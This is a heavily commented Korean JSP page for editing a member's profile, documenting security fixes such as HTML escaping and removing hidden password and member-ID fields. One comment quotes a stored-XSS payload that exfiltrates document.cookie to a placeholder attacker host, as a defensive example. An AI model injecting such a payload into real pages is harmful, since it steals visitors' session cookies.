<%-- 이 화면에서 MemberVO 클래스를 쓰겠다는 선언. 아래 자바 코드 구간에서 사용한다 --%>
<%@page import="Vo.MemberVO"%>
<%-- 이 페이지의 글자 인코딩을 UTF-8 로 정한다. 빠뜨리면 한글이 깨진다 --%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
    // 요청으로 온 한글이 깨지지 않게 UTF-8 로 읽는다
    request.setCharacterEncoding("UTF-8");
    // contextPath — getContextPath( ) 의 결과를 담는다
    String contextPath = request.getContextPath();
    // 앞 단계에서 실어 둔 "membervo" 짐을 꺼낸다
    MemberVO membervo = (MemberVO)request.getAttribute("membervo");
    /* [보안] DB 에서 꺼낸 값을 화면에 넣기 전에 HtmlUtil.escape 로 무해하게 바꾼다.
       왜 "내 정보 화면"에도 필요한가
         아래 값들은 value="..." 속성 안에 들어간다.
         이름에 아래를 저장하면 value 속성이 끊기면서 script 가 실제로 실행된다.
             "><script>fetch('http://공격자/?c='+document.cookie)</script>
         "내가 내 화면에서 실행되는 것뿐이니 괜찮다"고 생각하기 쉽지만,
         같은 값이 게시판 목록·관리자 화면 등 다른 곳에도 출력되면
         그 화면을 열어본 사람에게 그대로 옮겨간다. 저장형 XSS 다.
         값을 담는 순간 이스케이프하면 출력 지점을 하나도 빠뜨리지 않는다.
    */
    String id      = util.HtmlUtil.escape(membervo.getId()      != null ? membervo.getId()      : "");
    String name    = util.HtmlUtil.escape(membervo.getName()    != null ? membervo.getName()    : "");
    String email   = util.HtmlUtil.escape(membervo.getEmail()   != null ? membervo.getEmail()   : "");
    /* [보안 변경] 기존 비밀번호를 화면으로 내려보내지 않는다.
       예전에는 아래처럼 DB의 비밀번호를 꺼내
           String pass = membervo.getPass();
       화면 아래쪽 <input type="hidden" id="currentPass" value="<%=pass%\>"> 에 심어두고,
       "비밀번호를 안 바꾸면 그 값을 그대로 다시 서버로 보내는" 방식이었다.
       [참고] %\> 라고 적은 이유
         JSP 파서는 Java 문법을 모른다. <% 를 만나면 "처음 나오는 종료 기호"에서 끊는다.
         Java 주석 안이어도 마찬가지다. 그대로 쓰면 주석 중간에서 스크립틀릿이 끊기고
         닫히지 않은 주석이 남아 화면이 500 에러가 난다.
         그래서 퍼센트 뒤에 역슬래시를 넣어 %\> 로 쓴다. (board/read.jsp 에도 같은 설명이 있다)
       문제
         1. 브라우저에서 소스보기만 해도 비밀번호가 그대로 보였다
         2. 비밀번호를 해시로 저장하면, 화면이 보낸 해시를 서버가 또 해시해서
            이중 해시가 되어 그 회원은 다시 로그인할 수 없게 된다
       지금은
         - 비밀번호를 바꿀 때만 "현재 비밀번호"를 사용자가 직접 입력해 확인받고
         - 비워두면 서버가 pass 컬럼을 아예 수정하지 않는다 (기존 값 유지)
    */
    int    age     = membervo.getAge();   //숫자는 이스케이프 대상이 아니다
    // gender — 조건에 따라 둘 중 하나를 담는다
    String gender  = util.HtmlUtil.escape(membervo.getGender()  != null ? membervo.getGender()  : "");
    // address — 조건에 따라 둘 중 하나를 담는다
    String address = util.HtmlUtil.escape(membervo.getAddress() != null ? membervo.getAddress() : "");
%>
/* 이 화면에서만 쓰는 모양(CSS) 시작 */
<style>
/* ===== 전체 레이아웃 ===== */
.update-wrap {
    /* 가로로 이보다 커지지 않게 680px */
    max-width: 680px;
    /* 바깥 여백 30px auto */
    margin: 30px auto;
    /* 안쪽 여백 0 16px 40px */
    padding: 0 16px 40px;
    /* 글꼴 'Noto Sans KR', sans-serif */
    font-family: 'Noto Sans KR', sans-serif;
}
/* ===== 카드 ===== */
.update-card {
    /* 배경 #fff */
    background: #fff;
    /* 테두리 1px solid #e0e0e0 */
    border: 1px solid #e0e0e0;
    /* 모서리 둥글기 10px */
    border-radius: 10px;
    /* 넘칠 때 처리 hidden */
    overflow: hidden;
    /* 그림자 0 2px 12px rgba(0,0,0,0.07) */
    box-shadow: 0 2px 12px rgba(0,0,0,0.07);
}
/* ===== 카드 헤더 ===== */
.update-card-header {
    /* 배경 #cc0000 */
    background: #cc0000;
    /* 안쪽 여백 18px 28px */
    padding: 18px 28px;
    /* 요소를 어떤 방식으로 배치할지 flex */
    display: flex;
    /* 세로 방향 정렬 center */
    align-items: center;
    /* 요소 사이 간격 10px */
    gap: 10px;
}
.update-card-header h2 {
    /* 바깥 여백 0 */
    margin: 0;
    /* 글자 색 #fff */
    color: #fff;
    /* 글자 크기 1.15rem */
    font-size: 1.15rem;
    /* 글자 굵기 700 */
    font-weight: 700;
    /* 글자 사이 간격 -0.3px */
    letter-spacing: -0.3px;
}
.update-card-header .header-icon {
    /* 가로 크기 28px · 세로 크기 28px */
    width: 28px; height: 28px;
    /* 배경 rgba(255,255,255,0.25) */
    background: rgba(255,255,255,0.25);
    /* 모서리 둥글기 50% */
    border-radius: 50%;
    /* 요소를 어떤 방식으로 배치할지 flex · 세로 방향 정렬 center · 가로 방향 정렬 center */
    display: flex; align-items: center; justify-content: center;
    /* 글자 크기 14px · 글자 색 #fff */
    font-size: 14px; color: #fff;
}
/* ===== 카드 바디 ===== */
.update-card-body {
    /* 안쪽 여백 28px 32px */
    padding: 28px 32px;
}
/* ===== 아이디 배지 ===== */
.id-badge {
    /* 요소를 어떤 방식으로 배치할지 inline-flex */
    display: inline-flex;
    /* 세로 방향 정렬 center */
    align-items: center;
    /* 요소 사이 간격 8px */
    gap: 8px;
    /* 배경 #f5f5f5 */
    background: #f5f5f5;
    /* 테두리 1px solid #ddd */
    border: 1px solid #ddd;
    /* 모서리 둥글기 6px */
    border-radius: 6px;
    /* 안쪽 여백 8px 16px */
    padding: 8px 16px;
    /* 아래 바깥 여백 22px */
    margin-bottom: 22px;
    /* 가로 크기 100% */
    width: 100%;
}
.id-badge .label {
    /* 글자 크기 12px */
    font-size: 12px;
    /* 글자 색 #999 */
    color: #999;
    /* 공백·줄바꿈 처리 방식 nowrap */
    white-space: nowrap;
}
.id-badge .value {
    /* 글자 크기 14px */
    font-size: 14px;
    /* 글자 굵기 700 */
    font-weight: 700;
    /* 글자 색 #333 */
    color: #333;
}
/* ===== 구분선 ===== */
.divider {
    /* 테두리 none */
    border: none;
    /* 위 테두리 1px dashed #e0e0e0 */
    border-top: 1px dashed #e0e0e0;
    /* 바깥 여백 18px 0 */
    margin: 18px 0;
}
/* ===== 폼 행 ===== */
.form-row {
    /* 요소를 어떤 방식으로 배치할지 flex */
    display: flex;
    /* 세로 방향 정렬 flex-start */
    align-items: flex-start;
    /* 요소 사이 간격 10px */
    gap: 10px;
    /* 아래 바깥 여백 14px */
    margin-bottom: 14px;
}
.form-row .form-label {
    /* 가로 최소 크기 80px */
    min-width: 80px;
    /* 글자 크기 13px */
    font-size: 13px;
    /* 글자 굵기 600 */
    font-weight: 600;
    /* 글자 색 #555 */
    color: #555;
    /* 위 안쪽 여백 9px */
    padding-top: 9px;
}
.form-row .form-control-wrap {
    /* 늘어나는 비율 1 */
    flex: 1;
}
.form-row input[type=text],
.form-row input[type=password],
.form-row input[type=number],
.form-row input[type=email] {
    /* 가로 크기 100% */
    width: 100%;
    /* 안쪽 여백 8px 12px */
    padding: 8px 12px;
    /* 테두리 1px solid #ddd */
    border: 1px solid #ddd;
    /* 모서리 둥글기 6px */
    border-radius: 6px;
    /* 글자 크기 14px */
    font-size: 14px;
    /* 글자 색 #333 */
    color: #333;
    /* 바깥 윤곽선 none */
    outline: none;
    /* 값이 바뀔 때 부드럽게 border-color 0.2s */
    transition: border-color 0.2s;
    /* 크기 계산에 여백 포함 여부 border-box */
    box-sizing: border-box;
}
.form-row input:focus {
    /* 테두리 색 #cc0000 */
    border-color: #cc0000;
    /* 그림자 0 0 0 3px rgba(204,0,0,0.08) */
    box-shadow: 0 0 0 3px rgba(204,0,0,0.08);
}
/* ===== 성별 라디오 ===== */
.gender-group {
    /* 요소를 어떤 방식으로 배치할지 flex */
    display: flex;
    /* 요소 사이 간격 16px */
    gap: 16px;
    /* 위 안쪽 여백 8px */
    padding-top: 8px;
}
.gender-group label {
    /* 요소를 어떤 방식으로 배치할지 flex */
    display: flex;
    /* 세로 방향 정렬 center */
    align-items: center;
    /* 요소 사이 간격 5px */
    gap: 5px;
    /* 글자 크기 14px */
    font-size: 14px;
    /* 글자 색 #444 */
    color: #444;
    /* 마우스 커서 모양 pointer */
    cursor: pointer;
}
.gender-group input[type=radio] {
    /* 세부 모양 accent-color — #cc0000 */
    accent-color: #cc0000;
    /* 마우스 커서 모양 pointer */
    cursor: pointer;
}
/* ===== 힌트 텍스트 ===== */
.hint-text {
    /* 글자 크기 11px */
    font-size: 11px;
    /* 글자 색 #999 */
    color: #999;
    /* 위 바깥 여백 4px */
    margin-top: 4px;
}
/* ===== 버튼 영역 ===== */
.btn-area {
    /* 요소를 어떤 방식으로 배치할지 flex */
    display: flex;
    /* 가로 방향 정렬 space-between */
    justify-content: space-between;
    /* 세로 방향 정렬 center */
    align-items: center;
    /* 위 바깥 여백 26px */
    margin-top: 26px;
    /* 위 안쪽 여백 20px */
    padding-top: 20px;
    /* 위 테두리 1px solid #f0f0f0 */
    border-top: 1px solid #f0f0f0;
}
.btn-save {
    /* 안쪽 여백 10px 32px */
    padding: 10px 32px;
    /* 배경 #cc0000 */
    background: #cc0000;
    /* 글자 색 #fff */
    color: #fff;
    /* 테두리 none */
    border: none;
    /* 모서리 둥글기 6px */
    border-radius: 6px;
    /* 글자 크기 14px */
    font-size: 14px;
    /* 글자 굵기 700 */
    font-weight: 700;
    /* 마우스 커서 모양 pointer */
    cursor: pointer;
    /* 값이 바뀔 때 부드럽게 background 0.15s */
    transition: background 0.15s;
}
.btn-save:hover { background: #aa0000; }
.btn-cancel {
    /* 안쪽 여백 10px 20px */
    padding: 10px 20px;
    /* 배경 #fff */
    background: #fff;
    /* 글자 색 #555 */
    color: #555;
    /* 테두리 1px solid #ccc */
    border: 1px solid #ccc;
    /* 모서리 둥글기 6px */
    border-radius: 6px;
    /* 글자 크기 13px */
    font-size: 13px;
    /* 마우스 커서 모양 pointer */
    cursor: pointer;
    /* 값이 바뀔 때 부드럽게 all 0.15s */
    transition: all 0.15s;
}
.btn-cancel:hover { background: #f5f5f5; }
.btn-withdraw {
    /* 안쪽 여백 10px 20px */
    padding: 10px 20px;
    /* 배경 #fff */
    background: #fff;
    /* 글자 색 #c00 */
    color: #c00;
    /* 테두리 1px solid #ffaaaa */
    border: 1px solid #ffaaaa;
    /* 모서리 둥글기 6px */
    border-radius: 6px;
    /* 글자 크기 13px */
    font-size: 13px;
    /* 마우스 커서 모양 pointer */
    cursor: pointer;
    /* 값이 바뀔 때 부드럽게 all 0.15s */
    transition: all 0.15s;
}
.btn-withdraw:hover { background: #fff5f5; border-color: #cc0000; }
/*
  [터치 타깃 - 좁은 화면에서 44px 보장]
    padding: 10px 만으로는 높이가 40~42px 이라 규격(44px)에 조금 모자랐다.
    2~4px 차이지만 "저장"·"탈퇴" 처럼 되돌리기 어려운 버튼이라
    잘못 누르는 일을 줄이는 편이 낫다.
    입력칸도 같이 올린다. 이 화면은 app.css 의 .form-control 을 쓰지 않고
    자체 스타일을 갖고 있어서 공통 규칙이 적용되지 않는다.
*/
@media (hover: none), (pointer: coarse), (max-width: 767px) {
    .btn-save,
    .btn-cancel,
    .btn-withdraw {
        /* 세로로 이보다 작아지지 않게 44px */
        min-height: 44px;
    }
    /* 아이디·비밀번호·이름·나이·주소 입력칸 (위 .form-row 규칙과 같은 선택자를 쓴다) */
    .form-row input[type=text],
    .form-row input[type=password],
    .form-row input[type=number],
    .form-row input[type=email] {
        /* 세로로 이보다 작아지지 않게 44px */
        min-height: 44px;
    }
}
/* ===== 결과 메시지 ===== */
#resultMsg {
    /* 요소를 어떤 방식으로 배치할지 none */
    display: none;
    /* 안쪽 여백 10px 16px */
    padding: 10px 16px;
    /* 모서리 둥글기 6px */
    border-radius: 6px;
    /* 글자 크기 13px */
    font-size: 13px;
    /* 위 바깥 여백 14px */
    margin-top: 14px;
    /* 글자 정렬 center */
    text-align: center;
}
/* id="resultMsg" 인 요소 하나의 모양을 정한다 */
#resultMsg.success {
    /* 배경 #e8f5e9 */
    background: #e8f5e9;
    /* 글자 색 #2e7d32 */
    color: #2e7d32;
    /* 테두리 1px solid #a5d6a7 */
    border: 1px solid #a5d6a7;
}
/* id="resultMsg" 인 요소 하나의 모양을 정한다 */
#resultMsg.error {
    /* 배경 #ffebee */
    background: #ffebee;
    /* 글자 색 #c62828 */
    color: #c62828;
    /* 테두리 1px solid #ffcdd2 */
    border: 1px solid #ffcdd2;
}
</style>
<%-- update-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
<div class="update-wrap">
    <%-- update-card 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
    <div class="update-card">
        <!-- 카드 헤더 -->
        <div class="update-card-header">
            <%-- header-icon 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
            <div class="header-icon">&#128100;</div>
            <%-- 제목 --%>
            <h2>회원정보 수정</h2>
        </div>
        <!-- 카드 바디 -->
        <div class="update-card-body">
            <!-- 아이디 배지 (수정 불가) -->
            <div class="id-badge">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="label">아이디</span>
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="value"><%=id%></span>
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span style="margin-left:auto; font-size:11px; color:#aaa; background:#e9e9e9; padding:2px 8px; border-radius:10px;">변경 불가</span>
            </div>
            <!-- 새 비밀번호 -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">새 비밀번호</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- 입력칸 --%>
                    <input type="password" id="pass" autocomplete="new-password"
                           placeholder="새 비밀번호를 입력하세요 (4자 이상)" />
                    <%-- 문단 글 --%>
                    <p class="hint-text">&#8226; 변경하지 않으려면 비워두세요 (기존 비밀번호 유지)</p>
                </div>
            </div>
            <!-- 현재 비밀번호 (비밀번호를 바꿀 때만 필요) -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">현재 비밀번호</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- 입력칸 --%>
                    <input type="password" id="currentPass" autocomplete="current-password"
                           placeholder="비밀번호를 변경할 때만 입력하세요" />
                    <%-- 문단 글 --%>
                    <p class="hint-text">&#8226; 본인 확인을 위해 현재 비밀번호를 함께 입력해야 변경됩니다</p>
                </div>
            </div>
            <%-- 가로 구분선 --%>
            <hr class="divider">
            <!-- 이름 -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">이름</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- 입력칸 --%>
                    <input type="text" id="name" value="<%=name%>" placeholder="이름을 입력하세요" />
                </div>
            </div>
            <!-- 나이 -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">나이</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- 입력칸 --%>
                    <input type="number" id="age" value="<%=age%>" min="1" max="150" placeholder="나이를 입력하세요" />
                </div>
            </div>
            <!-- 성별 -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">성별</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- gender-group 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                    <div class="gender-group">
                        <%-- 입력칸에 붙는 이름표 --%>
                        <label>
                            <%-- gender 입력칸. 서버에서 request.getParameter("gender") 로 받는다 --%>
                            <input type="radio" name="gender" value="남"
                                <%-- 자바 값을 화면에 바로 찍는다 --%>
                                <%="남".equals(gender) ? "checked" : ""%> /> 남성
                        </label>
                        <%-- 입력칸에 붙는 이름표 --%>
                        <label>
                            <%-- gender 입력칸. 서버에서 request.getParameter("gender") 로 받는다 --%>
                            <input type="radio" name="gender" value="여"
                                <%-- 자바 값을 화면에 바로 찍는다 --%>
                                <%="여".equals(gender) ? "checked" : ""%> /> 여성
                        </label>
                    </div>
                </div>
            </div>
            <!-- 주소 -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">주소</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- 입력칸 --%>
                    <input type="text" id="address" value="<%=address%>" placeholder="주소를 입력하세요" />
                </div>
            </div>
            <!-- 이메일 -->
            <div class="form-row">
                <%-- 글자 묶음 — CSS 로 모양을 입히는 용도 --%>
                <span class="form-label">이메일</span>
                <%-- form-control-wrap 모양을 입힐 영역. 실제 모양은 CSS 에서 정한다 --%>
                <div class="form-control-wrap">
                    <%-- 입력칸 --%>
                    <input type="email" id="email" value="<%=email%>" placeholder="이메일을 입력하세요" />
                </div>
            </div>
            <!-- 결과 메시지 -->
            <div id="resultMsg"></div>
            <!-- 버튼 영역 -->
            <div class="btn-area">
                <%-- 내용을 묶는 상자 --%>
                <div style="display:flex; gap:8px;">
                    <%-- 누르면 동작하는 버튼 --%>
                    <button type="button" class="btn-save" id="btnSave">수정하기</button>
                    <%-- 누르면 동작하는 버튼 --%>
                    <button type="button" class="btn-cancel" id="btnCancel">목록으로</button>
                </div>
                <%-- 누르면 동작하는 버튼 --%>
                <button type="button" class="btn-withdraw" id="btnWithdraw">&#128465; 회원탈퇴</button>
            </div>
        </div><!-- /update-card-body -->
    </div><!-- /update-card -->
</div><!-- /update-wrap -->
<%--
 [삭제된 코드]
     <input type="hidden" id="currentPass" value="기존비밀번호" />
     <input type="hidden" id="memberId"    value="아이디" />
 두 개를 모두 없앤 이유
   currentPass : 기존 비밀번호를 HTML에 심는 것 자체가 노출이다. (위쪽 주석 참고)
   memberId    : "누구의 정보를 수정할지"를 화면이 보내는 값으로 결정하면 안 된다.
                 서버는 이제 세션에 저장된 로그인 아이디만 사용하므로 보낼 필요가 없다.
                 (예전에는 이 값을 admin 으로 바꿔 보내면 관리자 정보가 수정됐다)
--%>
<%-- [5단계 변경] jQuery CDN 제거 -> 순수 자바스크립트 + CarApp(js/app.js) 사용 --%>
<script type="text/javascript">
    <%-- contextPath — 글자값 "<%=contextPath%>" 을 담는다 --%>
    var contextPath = "<%=contextPath%>";   // JSP 가 서버에서 만든 프로젝트 경로를 자바스크립트 변수로 넘겨받는다
    /* ─────────────────────────────────────────────
       수정하기 버튼 클릭
       [변경] $("#btnSave").on("click", fn) -> addEventListener("click", fn)
    ───────────────────────────────────────────── */
    document.getElementById("btnSave").addEventListener("click", function() {
        <%-- name — val( ) 의 결과를 담는다 --%>
        var name        = CarApp.val("name").trim();   // 입력한 이름 (앞뒤 공백 제거)
        var ageVal      = CarApp.val("age").trim();   // 입력한 나이
        var address     = CarApp.val("address").trim();   // 입력한 주소
        var email       = CarApp.val("email").trim();   // 입력한 이메일
        var newPass     = CarApp.val("pass").trim();   // 새로 정할 비밀번호 (비워 두면 바꾸지 않는다)
        var currentPass = CarApp.val("currentPass");   //비밀번호 변경 시에만 사용 (trim 하지 않는다)
        /* 라디오 버튼에서 선택된 값 얻기
           [변경] $("input[name=gender]:checked").val()
                  -> document.querySelector("input[name=gender]:checked")
           선택된 것이 없으면 null 이므로 확인 후 사용한다. */
        var genderEl = document.querySelector("input[name=gender]:checked");
        var gender   = genderEl ? genderEl.value : "";   // 고른 것이 있으면 그 값을, 없으면 빈 문자열을 쓴다
        // ── 유효성 검사 ──
        if(!name) {
            showMsg("이름을 입력해 주세요.", "error"); return;
        }
        if(!ageVal || isNaN(ageVal) || parseInt(ageVal) < 1) {   // 비었거나·숫자가 아니거나·1보다 작으면.  isNaN 은 "숫자가 아니다" 라는 뜻이다
            showMsg("나이를 올바르게 입력해 주세요.", "error"); return;   // 안내를 띄우고 여기서 끝낸다
        }
        if(!gender) {   // 성별을 안 골랐으면
            showMsg("성별을 선택해 주세요.", "error"); return;   // 안내를 띄우고 여기서 끝낸다
        }
        if(!email) {   // 이메일이 비었으면
            showMsg("이메일을 입력해 주세요.", "error"); return;   // 안내를 띄우고 여기서 끝낸다
        }
        /* ── 비밀번호 변경 여부 판단 ──
           새 비밀번호를 비워두면 pass 를 아예 보내지 않는다.
           서버는 pass 가 없으면 비밀번호 컬럼을 수정하지 않는다(기존 값 유지).
           바꾸려는 경우에만 "현재 비밀번호"를 함께 보내 본인 확인을 받는다. */
        if(newPass !== "") {
            if(newPass.length < 4) {
                showMsg("새 비밀번호는 4자 이상이어야 합니다.", "error"); return;   // 너무 짧으면 안내를 띄우고 끝낸다
            }
            if(!currentPass) {   // 현재 비밀번호를 안 넣었으면
                showMsg("비밀번호를 변경하려면 현재 비밀번호를 입력해 주세요.", "error"); return;   // 본인 확인을 할 수 없으므로 안내를 띄우고 끝낸다
            }
        }
        // ── 서버로 보낼 값 구성 (아이디는 보내지 않는다 - 서버가 세션에서 판단) ──
        var sendData = {
            name:    name,   // 이름
            age:     ageVal,
            gender:  gender,
            address: address,
            email:   email
        };
        if(newPass !== "") {   // 새 비밀번호를 입력한 경우에만
            sendData.pass        = newPass;   // 새 비밀번호를 함께 보낸다
            sendData.currentPass = currentPass;   // 본인 확인용 현재 비밀번호도 함께 보낸다
        }
        // ── 수정 요청 ([변경] $.ajax -> CarApp.postForm) ──
        CarApp.postForm(contextPath + "/member/memberUpdatePro.me", sendData)
            .then(function(result) {
                <%-- 조건을 확인해 맞을 때만 아래를 실행한다 --%>
                if(result === "수정성공") {   // 서버가 "수정성공" 이라고 답했으면
                    showMsg("\u2714 회원정보가 성공적으로 수정되었습니다.", "success");   // 성공을 초록 상자로 안내한다 (\u2714 은 체크 표시다)
                    //입력했던 비밀번호는 화면에 남기지 않고 지운다
                    CarApp.id("pass").value = "";
                    CarApp.id("currentPass").value = "";
                <%-- 앞 조건이 아니면 이 조건을 확인한다 --%>
                } else if(result === "현재비밀번호불일치") {   // 서버가 "현재비밀번호불일치" 라고 답했으면
                    showMsg("현재 비밀번호가 일치하지 않습니다.", "error");   // 빨간 상자로 안내한다
                    CarApp.id("currentPass").value = "";   // 틀린 비밀번호는 지운다
                    CarApp.id("currentPass").focus();   // 그 칸에 커서를 놓아 다시 치게 한다
                <%-- 앞 조건이 아니면 이 조건을 확인한다 --%>
                } else if(result === "비밀번호길이부족") {   // 서버가 "비밀번호길이부족" 이라고 답했으면
                    showMsg("새 비밀번호는 4자 이상이어야 합니다.", "error");   // 빨간 상자로 안내한다
                <%-- 앞 조건이 아니면 이 조건을 확인한다 --%>
                } else if(result === "로그인필요") {   // 서버가 "로그인필요" 라고 답했으면
                    alert("로그인이 필요합니다. 로그인 화면으로 이동합니다.");   // 왜 이동하는지 먼저 알린다
                    location.href = contextPath + "/member/login.me";   // 로그인 화면으로 보낸다
                <%-- 위 조건들이 전부 아닐 때 --%>
                } else {
                    showMsg("수정에 실패했습니다. 다시 시도해 주세요.", "error");   // 그 밖의 실패면 실패했다고만 알린다
                }
            })
            .catch(function(err) {   // 통신 자체가 실패한 경우
                showMsg("서버 오류가 발생했습니다. (" + err.message + ")", "error");   // 실패 이유를 함께 보여 준다
            });
    });
    /* ─────────────────────────────────────────────
       목록으로 버튼
    ───────────────────────────────────────────── */
    document.getElementById("btnCancel").addEventListener("click", function() {
        location.href = contextPath + "/Car/Main";   // 메인 화면으로 되돌아간다
    });
    /* ─────────────────────────────────────────────
       회원탈퇴 버튼 클릭
    ───────────────────────────────────────────── */
    document.getElementById("btnWithdraw").addEventListener("click", function() {
        <%-- 조건을 확인해 맞을 때만 아래를 실행한다 --%>
        if(!confirm("정말 탈퇴하시겠습니까?\n탈퇴 후 복구가 불가능합니다.")) {   // 확인창에서 "취소" 를 누르면
            return;   // 아무것도 하지 않고 끝낸다 (되돌릴 수 없는 동작이라 반드시 확인한다)
        }
        <%-- 우리가 만든 도우미로 서버에 값을 보낸다 (화면 새로고침 없이) --%>
        CarApp.postForm(contextPath + "/member/memberDelete.me", {})   // 탈퇴 주소로 요청을 보낸다. 보낼 값이 없어 빈 객체를 넘긴다 (누구인지는 서버가 세션으로 안다)
            .then(function(result) {
                if(result === "삭제성공") {   // 서버가 "삭제성공" 이라고 답했으면
                    alert("회원 탈퇴가 완료되었습니다.\n이용해 주셔서 감사합니다.");   // 완료를 알린다
                    location.href = contextPath + "/Car/Main";   // 메인 화면으로 보낸다 (이미 로그아웃된 상태다)
                <%-- 앞 조건이 아니면 이 조건을 확인한다 --%>
                } else if(result === "로그인필요") {   // 서버가 "로그인필요" 라고 답했으면
                    alert("로그인이 필요합니다.");   // 이유를 알린다
                    location.href = contextPath + "/member/login.me";   // 로그인 화면으로 보낸다
                <%-- 위 조건들이 전부 아닐 때 --%>
                } else {
                    showMsg("탈퇴에 실패했습니다. 다시 시도해 주세요.", "error");   // 그 밖의 실패면 실패했다고만 알린다
                }
            })
            .catch(function(err) {   // 통신 자체가 실패한 경우
                showMsg("서버 오류가 발생했습니다. (" + err.message + ")", "error");   // 실패 이유를 함께 보여 준다
            });
    });
    /* ─────────────────────────────────────────────
       결과 메시지 표시 헬퍼
       [변경] jQuery 의 fadeIn / fadeOut 을 CSS 전환으로 대체했다.
              class 를 붙이고 떼는 것만으로 같은 효과를 낼 수 있다.
    ───────────────────────────────────────────── */
    function showMsg(msg, type) {
        <%-- 화면에서 id 가 "resultMsg" 인 요소를 찾는다 --%>
        var box = document.getElementById("resultMsg");   // 안내 문구를 띄울 상자를 찾는다
        if(!box) { return; }   // 그 상자가 없는 화면이면 아무것도 하지 않는다
        <%-- 화면에 그대로 보이는 글자: "box.classList.remove("su…" --%>
        box.classList.remove("success", "error");   // 이전에 붙었던 색 클래스를 모두 뗀다
        box.classList.add(type);   // 이번 종류(success/error)에 맞는 색 클래스를 붙인다
        box.textContent = msg;   // 안내 문구를 넣는다. textContent 라서 태그가 실행되지 않는다
        box.style.display = "block";   // 상자를 보이게 한다
        // 성공 메시지는 3초 후 자동 숨김
        if(type === "success") {
            setTimeout(function() { box.style.display = "none"; }, 3000);
        }
    }
</script>